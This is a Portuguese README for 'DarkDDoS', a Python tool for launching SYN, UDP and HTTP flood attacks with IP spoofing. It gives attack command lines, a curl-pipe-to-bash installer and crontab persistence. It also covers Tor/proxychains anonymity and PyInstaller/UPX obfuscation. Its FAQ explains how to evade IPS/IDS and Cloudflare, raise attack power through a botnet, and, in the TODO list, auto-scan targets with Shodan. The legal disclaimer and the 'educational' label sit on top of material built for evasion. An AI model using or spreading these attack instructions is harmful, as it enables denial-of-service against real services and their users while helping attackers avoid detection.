# DarkDDoS 🧨  
**Ferramenta Avançada de Teste de Stress de Rede com Múltiplos Vetores de Ataque**  

![DarkDDoS Demo](https://img.shields.io/badge/Version-2.0-red) 
![Python](https://img.shields.io/badge/Python-3.10%2B-blue)

## 📌 Índice
- [Visão Geral](#-visão-geral)
- [Features](#-features)
- [Métodos de Ataque](#-métodos-de-ataque)
- [Instalação](#-instalação)
- [Uso Avançado](#-uso-avançado)
- [Configuração](#-configuração)
- [Precauções de Segurança](#-precauções-de-segurança)
- [Legal](#-legal)
- [FAQ](#-faq)
- [Contribuição](#-contribuição)
- [TODO](#-todo)
- [Licença](#-licença)

## 🌐 Visão Geral
O DarkDDoS é uma ferramenta de teste de resistência de rede projetada para simular diversos tipos de ataques DDoS. Desenvolvido em Python com multi-threading, permite avaliar a capacidade de infraestruturas em lidar com tráfego malicioso em alta escala.

## 🚀 Features
### **Core Features**
- 3 Métodos Principais:
  - **SYN Flood** (spoofing de IPs aleatórios)
  - **UDP Flood** (pacotes de 1490 bytes com payload randômico)
  - **HTTP Flood** (requests GET paralelos com user-agent rotativo)
- Performance:
  - Até 1,000+ threads simultâneas
  - 50k+ pacotes/segundo (dependendo do hardware)
- Customização:
  - Duração programável (segundos)
  - Intensidade ajustável via número de threads

### **Advanced Features**
- Stealth Mode:
  - Rotação automática de user-agents
  - Spoofing de MAC address integrado (Linux/Android)
- Evasão Básica:
  - Padrão de tráfego aleatório
  - Intervalos de envio não determinísticos
- Logging:
  - Estatísticas em tempo real (pacotes enviados/seg)

## 💣 Métodos de Ataque
| Método   | Camada OSI | Eficácia | Detectabilidade |
|----------|------------|----------|-----------------|
| SYN      | 4 (Transporte) | Alta     | Média           |
| UDP      | 4 (Transporte) | Moderada | Baixa           |
| HTTP     | 7 (Aplicação)  | Variável | Alta            |

## ⚙️ Instalação
### Requisitos
- Python 3.10+
- Scapy (para spoofing SYN/UDP)
- `sudo` (opcional para raw sockets)

```bash
# Instalação Automática (Linux/Android Termux):
curl -sSL https://raw.githubusercontent.com/MIGUEL-XZ/DarkDDoS/main/installer.sh | bash

# Instalação Manual:
git clone https://github.com/MIGUEL-XZ/DarkDDoS.git
cd DarkDDoS
pip3 install -r requirements.txt


## 🔥 Uso Avançado
### Parâmetros e Opções
```bash
python3 DarkDDoS.py \
  -t <TARGET_IP> \
  -p <TARGET_PORT> \
  -m [syn|udp|http] \
  -th <THREADS> \
  -d <DURATION_SEC> \
  --proxies-file proxies.txt  # HTTP apenas
```

### Exemplos Práticos
1. **Ataque Rápido (60s):**
   ```bash
   python3 DarkDDoS.py -t 192.168.1.100 -p 443 -m syn -th 500
   ```

2. **Ataque Furtivo (HTTP):**
   ```bash
   python3 DarkDDoS.py -t exemplo.com -p 80 -m http --proxies-file tor_proxies.txt -th 200 -d 300
   ```

3. **Ataque Massivo (UDP):**
   ```bash
   sudo python3 DarkDDoS.py -t 10.0.0.5 -p 53 -m udp -th 1000 -d 600
   ```

## 🔧 Configuração
### **Arquivo de Proxies**
```txt
# proxies.txt (formato: IP:PORT)
45.155.68.129:3128
203.189.137.181:8080
...
```

### **Persistência (Linux)**
```bash
# Adicionar ao crontab para auto-inicialização:
(crontab -l 2>/dev/null; echo "@reboot cd /path/to/DarkDDoS && python3 DarkDDoS.py -t...") | crontab -
```

### **VPN/Anonimato**
```bash
# Usar com Tor:
sudo apt install tor
sudo service tor start
proxychains python3 DarkDDoS.py -t ...
```

## 🛡️ Precauções de Segurança
- **Isolamento de Rede:** Execute em máquina virtual/VPS descartável
- **Obfuscação:** 
  ```bash
  # Recompilar com PyInstaller + UPX:
  pyinstaller --onefile --strip --key $(openssl rand -hex 16) DarkDDoS.py
  upx --ultra-brute dist/DarkDDoS
  ```
- **Monitoramento:** Use ferramentas como `iftop` ou `nload` para análise de tráfego

## ⚖️ Legal
**AVISO LEGAL EXPLÍCITO**  
- O uso não autorizado desta ferramenta viola:
  - Lei de Crimes Cibernéticos (Art. 154-A, CP)
  - DMCA Section 1201 (EUA)
  - Diretiva UE 2013/40  
- O desenvolvedor não se responsabiliza por uso ilegal.  
- **Recomendado apenas para:**  
  - Testes em ambiente controlado  
  - Redes próprias com autorização formal  

## ❓ FAQ
**Q:** Como evitar bloqueio por IPS/IDS?  
**R:** Use `--proxies-file` com listas de IPs rotativos e combine com SYN spoofing.

**Q:** Por que meu ataque HTTP é bloqueado?  
**R:** Servidores modernos (Cloudflare, AWS) detectam padrões simples. Use técnicas de rate-limiting evasion.

**Q:** Como aumentar o poder de ataque?  
**R:** Distribua o ataque via botnet usando `-th 5000` e múltiplos nós.

## 🤝 Contribuição
1. Fork o repositório
2. Crie uma branch: `git checkout -b feature/nova-func`
3. Commit: `git commit -am 'Adicionei X feature'`
4. Push: `git push origin feature/nova-func`
5. Abra um Pull Request

## 📌 TODO
- [X] Suporte básico a proxies
- [ ] Módulo ICMP Flood
- [ ] Modo Slowloris (Layer 7)
- [ ] Integração com Shodan API (auto-scan de alvos)
- [ ] Painel de controle web (Flask/Django)

## 📜 Licença
Este projeto está sob licença GPL-3.0. Veja o arquivo [LICENSE](LICENSE) para detalhes.

---

**⚠️ Nota Final:** Esta ferramenta é para fins educacionais. Mantenha-se dentro da legalidade e obtenha permissão por escrito antes de qualquer teste.  
